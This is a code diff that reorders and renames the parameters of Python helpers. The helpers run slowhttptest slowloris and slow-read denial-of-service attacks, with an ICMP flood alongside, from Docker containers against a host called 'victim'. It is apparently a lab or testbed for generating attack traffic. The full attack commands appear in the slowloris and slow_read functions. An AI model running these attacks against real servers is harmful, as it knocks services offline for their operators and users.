@@ -15,17 +15,17 @@ def icmp_flood(container_id, ip_address=""):
 
     print(result.output.decode())
 
-def slowloris(container_id, attack_duration, number_of_connections, connection_rate):
+def slowloris(container_id, number_of_connections, connection_rate, attack_duration):
     container = client.containers.get(container_id)
     result = container.exec_run(
         f"slowhttptest -c {number_of_connections} -r {connection_rate} -l {attack_duration} -g -u http://victim"
     )
     print(result.output.decode())
 
-def slow_read(container_id, attack_duration, number_of_connections, connection_rate, pipeline_factor, read_interval, read_bytes, window_size_start, window_size_end):
+def slow_read(container_id, number_of_connections, connection_rate, attack_duration, request_multiplier, read_interval, read_bytes, window_size_start, window_size_end):
     container = client.containers.get(container_id)
     result = container.exec_run(
-        f"slowhttptest  -X -k {pipeline_factor} -c {number_of_connections} -r {connection_rate} -l {attack_duration} -n {read_interval} -z {read_bytes} -w {window_size_start} -y {window_size_end} -g -u http://victim"
+        f"slowhttptest  -X -k {request_multiplier} -c {number_of_connections} -r {connection_rate} -l {attack_duration} -n {read_interval} -z {read_bytes} -w {window_size_start} -y {window_size_end} -g -u http://victim"
     )
     print(result.output.decode())
 
